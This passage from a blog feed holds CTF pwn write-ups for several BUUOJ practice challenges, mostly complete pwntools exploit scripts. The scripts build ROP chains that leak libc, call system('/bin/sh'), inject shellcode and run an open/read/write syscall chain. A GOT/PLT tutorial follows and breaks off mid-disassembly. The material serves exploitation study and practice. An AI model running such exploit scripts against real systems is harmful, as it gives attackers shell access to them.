    <content type="html"><![CDATA[<h3 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_c_1">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) </span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class="hljs-number">0x4006b9</span><br>rdi=<span class="hljs-number">0x400c83</span><br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#第一次攻击绕过函数</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()<span class="hljs-comment">#接收字符串Ciphertext</span><br>p.recvline()    <span class="hljs-comment">#加密后的密文</span><br><span class="hljs-comment">#这里注意需要接收2次</span><br> <br>puts_addr=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))  <span class="hljs-comment">#得到 puts 函数 的地址</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr) <span class="hljs-comment">#获取libc的版本</span><br>offset=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment">#计算偏移量</span><br>binsh=offset+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment">#计算字符串&quot;/bin/sh&quot;的地址</span><br>system=offset+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment">#计算函数system的地址</span><br> <br><span class="hljs-comment">#第二次攻击getshell</span><br> <br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)     <span class="hljs-comment">#   再一次执行 一遍流程</span><br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class="hljs-comment"># ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</span><br><span class="hljs-comment"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure><h3 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h3><p><a href="https://buuoj.cn/challenges#bjdctf_2020_babyrop">https://buuoj.cn/challenges#bjdctf_2020_babyrop</a></p><p>非常基本的一道利用puts函数构造rop链泄露libc基址的题目</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25323</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)<br><br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>poprdi_ret = <span class="hljs-number">0x400733</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>s = p.recv()<br><span class="hljs-built_in">print</span>(s)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendline(payload)<br><br>s = p.recv()<br><br>puts_addr = u64(s[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc =LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>offset = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h3><p><a href="https://buuoj.cn/challenges#get_started_3dsctf_2016">https://buuoj.cn/challenges#get_started_3dsctf_2016</a></p><p>一道十分简单的栈溢出，将main的返回地址移交给自带的get_flag函数</p><p>把这道题列出来的原因在于，程序没有开启标准输入输出，</p><p>如果单纯执行完get_flag不设置一个正确的返回地址，这个函数里的输出显示不出来</p><p>（详细原因目前也不是很清楚）</p><p><strong>Exp</strong></p><p>针对上述问题，选择exit函数作为get_flag的返回地址（不能放一个空着的p32(0)进去）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,27230)</span><br>p = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>get_flag = <span class="hljs-number">0x80489A0</span><br>param1 = <span class="hljs-number">0x308CD64F</span><br>param2 = <span class="hljs-number">0x195719D1</span><br><br>sleep(<span class="hljs-number">0.1</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p32(get_flag) +p32(<span class="hljs-number">0x0804E6A0</span>) + p32(param1) + p32(param2)<br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="题目4"><a href="#题目4" class="headerlink" title="题目4"></a>题目4</h3><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop</a></p><p>从给定libc获取获取基址</p><p>由于给了libc版本，此exp展示使用指定的libc文件获取偏移的方法</p><p>不用给的libc文件的见下一道题，harekaze2019的babyrop2</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28818</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment">#payload 1</span><br>payload1 = <span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;\xff&#x27;</span> * <span class="hljs-number">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-comment">#payload 2</span><br>payload2 = (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(e.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">0x08048825</span>) +p32(<span class="hljs-number">1</span>) + p32(e.got[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">4</span>)<br><br>p.sendline(payload2)<br><br><span class="hljs-comment"># leak addr</span><br>write_got = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_got))<br><br><span class="hljs-comment">#payload 3</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="题目5"><a href="#题目5" class="headerlink" title="题目5"></a>题目5</h3><p><strong>题目</strong></p><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></p><p>和前面一个题目同样，是一个构造rop链的栈溢出，虽然题目也给了libc文件，但是不是必要的</p><p><strong>方法</strong></p><p>这道题目的差别或值得注意的地方在于</p><ol><li><p>不再是用puts函数（只需要一个参数），这道题目中可以用printf构造rop链</p><p>printf有两个参数，除了rdi寄存器之外，还需要rsi寄存器来传递参数，但是这个程序里没有直接的<code>pop rsi, ret</code>的代码，只有一个<code>pop rsi, pop r15, ret</code>，因此需要再额外给r15在栈上留出一个空间。详见exp代码。</p></li><li><p>用read函数进行libc基地址泄露，虽然理论上用printf也可以，但是我不知道为什么没有成功，我在网上查的时候别人也有这个问题</p></li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&#x27;./babyrop2&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29507</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./babyrop2&#x27;</span>)<br><br>poprdi_ret = <span class="hljs-number">0x400733</span><br>poprsi_popr15_ret = <span class="hljs-number">0x400731</span><br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>format_str = <span class="hljs-number">0x400790</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(format_str) + \<br>          p64(poprsi_popr15_ret) + p64(read_got) + p64(<span class="hljs-number">0</span>) + p64(printf_plt) + p64(main)<br><br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>,payload)<br><br>read_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(read_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>, read_addr)<br>offset = read_addr - libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="题目6"><a href="#题目6" class="headerlink" title="题目6"></a>题目6</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_n_5">https://buuoj.cn/challenges#ciscn_2019_n_5</a></p><p><img src="/img/ciscn_2019_n_5/1.jpg"></p><p>依旧是栈溢出，可以构造rop，也可以直接ret2shellcode（没开NX）</p><p>由于rop写习惯了，先列出rop的做法</p><p><img src="/img/ciscn_2019_n_5/2.jpg"></p><p>第一个输入随便写，第二个输入开始溢出</p><p><img src="/img/ciscn_2019_n_5/3.jpg"></p><p>溢出30+2+8 = 40个字节，用puts的got表来泄露libc基址</p><p>值得注意的是返回main后第二遍溢出时需要栈对齐</p><p><strong>Exp1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27829</span>)<br><br>e = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_5&quot;</span>)<br><br>main = e.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400713</span><br>ret = <span class="hljs-number">0x4004c9</span><br><br>p.recvline()<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>p.recvline()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;What do you want to say to me?\n&quot;</span>, payload)<br><br>puts_addr =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>offset = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>p.recvline()<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>p.recvline()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<br>p.sendlineafter(<span class="hljs-string">b&quot;What do you want to say to me?\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>ret2shellcode</strong></p><p><img src="/img/ciscn_2019_n_5/4.jpg"></p><p>由于题目给了bss段上100个字节的空间，可以用来写shellcode</p><p>需要在注意的包括context.arch设置平台环境</p><p>而且特意看了一下 <code>len(shellcode) </code>是 48 &lt; 100字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27829</span>)<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class="hljs-number">0x0601080</span><br>p.sendlineafter(<span class="hljs-string">&quot;tell me your name\n&quot;</span>,shellcode)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span>) + p64(name_addr)<br>p.sendlineafter(<span class="hljs-string">b&quot;What do you want to say to me?\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="题目7"><a href="#题目7" class="headerlink" title="题目7"></a>题目7</h3><p>发现没有写过ret2syscall的题目，记录一下方便忘了再看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;/flag\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x48</span>-<span class="hljs-number">6</span>) + p64(pop_rdi)+p64(buf)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)\<br>    + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) \<br>    + p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscall) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) +p64(pop_rsi) + p64(buf+<span class="hljs-number">0x10</span>) \<br>    +p64(pop_rdx)+p64(<span class="hljs-number">0x32</span>) +p64(pop_rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)+ p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) \<br>    + p64(buf+<span class="hljs-number">0x10</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x90</span>) + p64(pop_rax) + p64(<span class="hljs-number">1</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">%rax</th><th align="left">System call</th><th align="left">%rdi</th><th align="left">%rsi</th><th align="left">%rdx</th><th align="left">%r10</th><th align="left">%r8</th><th align="left">%r9</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">sys_read</td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">1</td><td align="left">sys_write</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">2</td><td align="left">sys_open</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">3</td><td align="left">sys_close</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GOT表和PLT表</title>
    <link href="/2022/11/16/ctf-pwn/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/"/>
    <url>/2022/11/16/ctf-pwn/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>Linux 动态链接与延迟绑定机制</p><p><strong>Q：</strong></p><ol><li>为什么ret2libc泄露基址时要选择已经使用过的函数？</li><li>何为延迟绑定？</li></ol><h2 id="Linux-动态链接与延迟绑定机制"><a href="#Linux-动态链接与延迟绑定机制" class="headerlink" title="Linux 动态链接与延迟绑定机制"></a>Linux 动态链接与延迟绑定机制</h2><p>​    假设，写了一个函数<code>f()</code>，调用了glibc中函数<code>x()</code>，在可执行文件是如何编译的？</p><p>​    对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数<code>f()</code>的汇编指令中直接call函数<code>x()</code>的真实地址</p><p>​    因此，需要在调用前加入一个寻找函数地址的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br> ...<br> call f_stub<br> ...<br> <br> ...<br> f_stub:<br>  1. find and save function f() entry point in f_stub_addr<br>     2. mov eax, [f_addr]<br>        jmp eax<br> ...<br> <br>.data<br> f_addr  // 存储实际的f()地址<br></code></pre></td></tr></table></figure><p>​    如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它</p><p>​    linux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)</p><p>​    后文会具体分析其机制</p><h5 id="实验参考"><a href="#实验参考" class="headerlink" title="实验参考"></a>实验参考</h5><p><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p><p><a href="https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click</a></p><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_banner</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    print_banner();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="编译链接"><a href="#编译链接" class="headerlink" title="编译链接"></a>编译链接</h5><p><code>gcc -Wall  -g test.c -o test.o -m32</code></p><p><strong>平台</strong>： <strong>kali</strong>-<strong>linux</strong></p><p>开始调试</p><p><strong>首先，在printf函数调用前下一个断点</strong></p><p><img src="/img/plt&got/1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[-------------------------------------code-------------------------------------]<br>   0x555555555134 &lt;frame_dummy+4&gt;:      jmp    0x5555555550b0 &lt;register_tm_clones&gt;<br>   0x555555555139 &lt;print_banner&gt;:       push   rbp<br>   0x55555555513a &lt;print_banner+1&gt;:     mov    rbp,rsp<br>=&gt; 0x55555555513d &lt;print_banner+4&gt;:     lea    rax,[rip+0xec4]        # 0x555555556008<br>   0x555555555144 &lt;print_banner+11&gt;:    mov    rdi,rax<br>   0x555555555147 &lt;print_banner+14&gt;:    call   0x555555555030 &lt;puts@plt&gt;<br>   0x55555555514c &lt;print_banner+19&gt;:    nop<br>   0x55555555514d &lt;print_banner+20&gt;:    pop    